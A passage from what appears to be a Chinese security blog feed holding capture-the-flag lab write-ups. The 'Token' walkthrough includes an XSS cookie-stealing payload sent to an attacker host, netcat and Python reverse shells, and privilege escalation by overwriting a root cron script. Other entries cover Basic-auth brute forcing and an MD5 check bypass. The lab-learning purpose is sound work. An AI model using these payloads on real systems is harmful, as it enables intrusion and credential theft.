class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,5000 192.168.2.63<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 09:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.63<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.62 (Debian)<br>| http-title: \xE7\xAE\xA1\xE7\x90\x86\xE5\x91\x98\xE7\x99\xBB\xE5\xBD\x95<br>|_Requested resource was login.php<br>5000/tcp open  upnp?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 404 NOT FOUND<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Fri, 25 Jul 2025 01:02:23 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 207<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html lang=en&gt;<br>|     &lt;title&gt;404 Not Found&lt;/title&gt;<br>|     &lt;h1&gt;Not Found&lt;/h1&gt;<br>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 404 NOT FOUND<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Fri, 25 Jul 2025 01:02:38 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 207<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html lang=en&gt;<br>|     &lt;title&gt;404 Not Found&lt;/title&gt;<br>|     &lt;h1&gt;Not Found&lt;/h1&gt;<br>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<br>|   Help: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request syntax (<span class="hljs-string">&#x27;HELP&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?<br>....<br>MAC Address: 08:00:27:5C:90:A4 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 94.98 seconds<br></code></pre></td></tr></table></figure><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口，是一个登录页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507250912407.png"></p><h3 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1-目录扫描"></a>1-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.63 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.63<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,md,db,js,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/index.php            (Status: 302) [Size: 0] [--&gt; login.php]<br>/login.php            (Status: 200) [Size: 3484]<br>/.html                (Status: 403) [Size: 277]<br>/feedback.php         (Status: 200) [Size: 5008]<br>/messages.txt         (Status: 200) [Size: 0]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]<br>/dashboard.php        (Status: 302) [Size: 0] [--&gt; login.php]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1764480 / 1764488 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>找到两个路径<code>feedback.php</code>和<code>messages.txt</code>，进行访问，发现是一个留言页面和保存留言的页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507250950361.png"></p><h3 id="2-XSS漏洞"><a href="#2-XSS漏洞" class="headerlink" title="2-XSS漏洞"></a>2-XSS漏洞</h3><p>查看<code>feedback.php</code>源码，发现提示存在<code>xss漏洞</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507251420950.png"></p><p>构造一个xss脚本，获取<code>flask_token</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://192.168.2.4/cookie_catcher.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><code>flask_token=Authorization: Bearer ADMIN_T0K3N_Flask_Dashazi</code></p><h2 id="2、5000端口"><a href="#2、5000端口" class="headerlink" title="2、5000端口"></a>2、5000端口</h2><h3 id="1-目录扫描-1"><a href="#1-目录扫描-1" class="headerlink" title="1-目录扫描"></a>1-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.63:5000&quot;</span><br>Target: http://192.168.2.63:5000/<br><br>[14:50:56] Starting: <br>[14:51:12] 302 -  199B  - /admin  -&gt;  /login<br>[14:51:32] 401 -   25B  - /cmd<br>[14:51:43] 200 -   44B  - /flag<br>[14:51:54] 200 -  323B  - /login<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>访问<code>cmd</code>，发现需要认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# curl http://192.168.2.63:5000/cmd                                                                                                    <br>&#123;<span class="hljs-string">&quot;error&quot;</span>:<span class="hljs-string">&quot;Unauthorized&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2-命令执行"></a>2-命令执行</h3><p>加上获取到<code>flask_token</code>，发现可以执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# curl <span class="hljs-string">&quot;http://192.168.2.63:5000/cmd?cmd=id&quot;</span> -H <span class="hljs-string">&quot;Authorization: Bearer ADMIN_T0K3N_Flask_Dashazi&quot;</span> <br>&#123;<span class="hljs-string">&quot;output&quot;</span>:<span class="hljs-string">&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)\n&quot;</span>,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;success&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="四、获取www-data权限"><a href="#四、获取www-data权限" class="headerlink" title="四、获取www-data权限"></a>四、获取www-data权限</h1><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# curl <span class="hljs-string">&quot;http://192.168.2.63:5000/cmd?cmd=busybox%20nc%20192.168.2.4%204444%20-e%20/bin/bash&quot;</span> -H <span class="hljs-string">&quot;Authorization: Bearer ADMIN_T0K3N_Flask_Dashazi&quot;</span><br></code></pre></td></tr></table></figure><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br><span class="hljs-built_in">id</span><br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.63] 54420<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Token:/home/catalytic$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-caaea73c2af7f9b2391cc15f398b0e74&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><p>查看以<code>root</code>权限运行的进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Token:/home/catalytic$ ps aux | grep root<br>....<br>root      687534  0.0  0.0   2472   512 ?        Ss   03:27   0:00 /bin/sh -c /usr/bin/python3  /var/www/html/check_messages_cron/check_messages.py<br>root      687538  3.8  1.1 107264 24088 ?        Sl   03:27   0:00 /usr/bin/python3 /var/www/html/check_messages_cron/check_messages.py<br>....<br>www-data  689354  0.0  0.0   6176   632 pts/0    S+   03:27   0:00 grep root<br></code></pre></td></tr></table></figure><p>发现在<code>/var/www/html/check_messages_cron/check_messages.py</code>以<code>root</code>权限运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Token:~/html$ <span class="hljs-built_in">ls</span> -la check_messages_cron/check_messages.py <br>-rwxr-xr-x 1 www-data www-data 1842 Jul 22 02:03 check_messages_cron/check_messages.py<br></code></pre></td></tr></table></figure><p>修改文件<code>check_messages.py</code>的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span><span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.4&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span> &gt; /var/www/html/check_messages_cron/check_messages.py<br></code></pre></td></tr></table></figure><p>等待定时任务执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br><span class="hljs-built_in">id</span><br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.63] 60762<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1002175): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@Token:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@Token:~# <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Token:~# <span class="hljs-built_in">cat</span> root.txt<br>flag&#123;root-d404401c8c6495b206fc35c95e55a6d5&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>提权-crotable</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow-WEB入门-爆破</title>
    <link href="/CTFShow/CTFShow-WEB%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/"/>
    <url>/CTFShow/CTFShow-WEB%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB-21-Basic认证"><a href="#WEB-21-Basic认证" class="headerlink" title="WEB-21-Basic认证"></a>WEB-21-Basic认证</h2><p>抓包，得到<code>Authorization请求头</code>用于验证是否有从服务器访问所需数据的权限<br><code>Authorization: Basic YWRtaW46YWRtaW4=</code> 解密后为<code>admin:admin</code>，格式为：<code>用户名:密码</code></p><ul><li>将请求包发送到<code>intruder</code>中，选择<code>sniper模式</code></li><li>然后payload选择<code>Custom iterator</code>，根据已知格式，我们设置第一组payload位账号：<code>admin</code>，第二组一个冒号<code>:</code>，第三组密码：<code>密码字典</code>。 </li><li>设置<code>Payload Processing</code>的base64加密，点击<code>add</code>，选择<code>encode&gt;Base64-encode</code></li><li>最后将<code>PayLoad Encoding</code>取消选择<code>urlencode</code>加密特俗字符串。<br>找到用户名和密码：<code>YWRtaW46c2hhcms2Mw==</code>，解密为：<code>admin:shark63</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507241056058.png"></li></ul><h2 id="WEB-22-子域名爆破"><a href="#WEB-22-子域名爆破" class="headerlink" title="WEB-22-子域名爆破"></a>WEB-22-子域名爆破</h2><p>子域名爆破发现子域名<code>vip.ctf.show</code>下面有flag—&gt;<code>flag&#123;ctf_show_web&#125;</code><br>由于目前域名失效，已无法进行爆破</p><h2 id="WEB-23-MD5值爆破"><a href="#WEB-23-MD5值爆破" class="headerlink" title="WEB-23-MD5值爆破"></a>WEB-23-MD5值爆破</h2><p>找到相关代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) ===<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))&#123; <span class="hljs-comment">//md5值第2,15,18位字符相同</span><br>        <span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))+<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>))+<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))/<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">31</span>,<span class="hljs-number">1</span>)))&#123;   <span class="hljs-comment">//md5值第32位字符是3</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507241133066.png"><br><code>token=422</code>，MD5值为<code>f85454e8279be180185cac7d243c5eb3</code></p><h2 id="WEB-24"><a href="#WEB-24" class="headerlink" title="WEB-24"></a>WEB-24</h2><h2 id="WEB-25"><a href="#WEB-25" class="headerlink" title="WEB-25"></a>WEB-25</h2><h2 id="WEB-26"><a href="#WEB-26" class="headerlink" title="WEB-26"></a>WEB-26</h2><h2 id="WEB-27"><a href="#WEB-27" class="headerlink" title="WEB-27"></a>WEB-27</h2><h2 id="WEB-28"><a href="#WEB-28" class="headerlink" title="WEB-28"></a>WEB-28</h2>]]></content>
    
    
    <categories>
      
      <category>CTFShow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB入门</tag>
      
      <tag>爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Base</title>
    <link href="/Maze-sec/Base/"/>
    <url>/Maze-sec/Base/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec]<br>└─# nmap -sn 192.168.2.0/24     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-23 14:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00097s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00057s latency).<br>MAC Address: 08:00:27:09:B1:6F (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.62<br>Host is up (0.00065s latency).<br>MAC Address: 08:00:27:8D:84:B2 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.03 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.62</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.62                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-23 14:21 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.62<br>Host is up (0.00041s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:8D:84:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.24 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫"><a href="#2、详细信息扫" class="headerlink" title="2、详细信息扫"></a>2、详细信息扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.62 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-23 14:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.62<br>Host is up (0.00096s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-generator: PivotX<br>|_http-title:         PivotX Powered    <br>| http-robots.txt: 1 disallowed entry <br>|_/pivotx/<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:8D:84:B2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.05 seconds<br></code></pre></td></tr></table></figure><p>80端口开启Apache服务，存在<code>robots.txt</code>文件，<code>robots.txt</code>里面包含路径<code>pivotx</code></p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，是一个框架为<code>PivotX</code>的内容管理系统<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231431643.png"></p><p>访问<code>robots.txt</code>里面的路径<code>pivotx</code>，找到系统后台登录页面，需要账号和密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231433248.png"></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 